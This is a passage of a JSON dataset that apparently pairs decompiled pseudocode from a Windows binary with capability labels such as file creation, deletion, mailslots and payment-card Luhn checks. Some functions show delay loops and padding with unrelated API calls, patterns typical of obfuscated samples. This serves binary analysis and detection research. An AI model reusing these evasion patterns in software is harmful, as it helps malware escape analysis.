        "decompiled_code": "\nuint main(void)\n\n{\n    uint32_t uVar1;\n    int32_t var_90h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    do {\n        if (uVar1 < 0x1c865) {\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n    } while (((uVar1 < 0x1e974290) || (var_90h == 0xad642ec)) && (uVar1 = uVar1 + 1,  uVar1 < 0x8e2a75d8));\n    if (*0x444f04 == 0x9e) {\n        fcn.00403561(0, 0, 0);\n        fcn.004034b3(0);\n        fcn.0040349c(0);\n        fcn.0040332b();\n    }\n    *0x444f04 = *0x40f2e4;\n    *0x445318 = *0x40f008;\n    fcn.00402afd();\n    return 0;\n}\n",
        "token_count": 433
    },
    "004043ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043ee(uint arg_8h)\n\n{\n    fcn.004042c2(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "00405e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405e14)\n// WARNING: Removing unreachable block (ram,0x00405e1a)\n// WARNING: Removing unreachable block (ram,0x00405e1c)\n\nvoid fcn.00405e00(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "0040b4df": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040b4df(void)\n\n{\n    *0x41f8f4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x4025b8, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 68
    },
    "004028d9": {
        "rules": [
            "connect pipe",
            "read pipe",
            "write pipe",
            "get disk information",
            "create directory",
            "get common file path",
            "move file",
            "create mailslot"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFilePart\n\nvoid __cdecl fcn.004028d9(int32_t arg_8h)\n\n{\n    uchar auStack8228 [2048];\n    uint lpszVolumeMountPoint;\n    uint lpBuffer;\n    uint var_c20h;\n    uint var_820h;\n    uint lpOutBuffer;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint *puStack144;\n    uint uStack140;\n    uint *puStack136;\n    uint uStack132;\n    uint *puStack128;\n    uint uStack124;\n    uint *puStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint uStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint lpBytesRead;\n    uint lpNumberOfEventsRead;\n    uint lpFilePart;\n    \n    lpFilePart = 0x4028e6;\n    fcn.00403300();\n    if (*0x444f04 == 0x37) {\n        lpNumberOfEventsRead = 0;\n        lpBytesRead = 0;\n        uStack20 = 0;\n        uStack24 = 0x4028ff;\n        (*_sym.imp.KERNEL32.dll_CommConfigDialogA)();\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = 0;\n        var_20h = 0;\n        uStack40 = 0x402909;\n        (*_sym.imp.KERNEL32.dll_CreateMailslotA)();\n        uStack40 = 0;\n        puStack44 = &fcn.004028d9::lpBuffer;\n        puStack48 = 0x402917;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n        puStack48 = &stack0xffffdfdc;\n        uStack52 = 0;\n        uStack56 = 0x402925;\n        (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)();\n        uStack56 = 0;\n        puStack60 = &fcn.004028d9::lpBytesRead;\n        uStack64 = 0;\n        puStack68 = &fcn.004028d9::lpOutBuffer;\n        uStack72 = 0;\n        uStack76 = 0;\n        uStack80 = 0;\n        uStack84 = 0x40293b;\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)();\n        uStack84 = 0;\n        uStack88 = 0;\n        puStack92 = 0x402943;\n        (*_sym.imp.KERNEL32.dll_MoveFileA)();\n        puStack92 = &fcn.004028d9::lpFilePart;\n        puStack96 = &fcn.004028d9::var_c20h;\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0;\n        uStack112 = 0;\n        uStack116 = 0x402958;\n        (*_sym.imp.KERNEL32.dll_SearchPathA)();\n        uStack116 = 0;\n        puStack120 = &fcn.004028d9::lpszVolumeMountPoint;\n        uStack124 = 0;\n        puStack128 = 0x402967;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeMountPointA)();\n        puStack128 = &fcn.004028d9::lpNumberOfEventsRead;\n        uStack132 = 0;\n        puStack136 = &fcn.004028d9::var_20h;\n        uStack140 = 0;\n        puStack144 = 0x402977;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        puStack144 = &fcn.004028d9::var_820h;\n        uStack148 = 0;\n        uStack152 = 0x402985;\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n        uStack152 = 0;\n        uStack156 = 0;\n        uStack160 = 0;\n        uStack164 = 0x40298e;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExW)();\n        uStack164 = 0x4012a4;\n        uStack168 = 0x402999;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStack168 = 0;\n        uStack172 = 0;\n        uStack176 = 0;\n        uStack180 = 0;\n        uStack184 = 0x4029a3;\n        (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n        uStack184 = 0x4029a9;\n        (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        uStack184 = 0;\n        uStack188 = 0;\n        uStack192 = 0;\n        uStack196 = 0;\n        uStack200 = 0x4029b3;\n        (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n        uStack200 = 0x4029b9;\n        (*_sym.imp.KERNEL32.dll_AreFileApisANSI)();\n    }\n    *(*0x444ab0 + arg_8h) = *(*0x445318 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 1348
    },
    "004034b3": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004034b3(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.004044ee(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 117
    }
}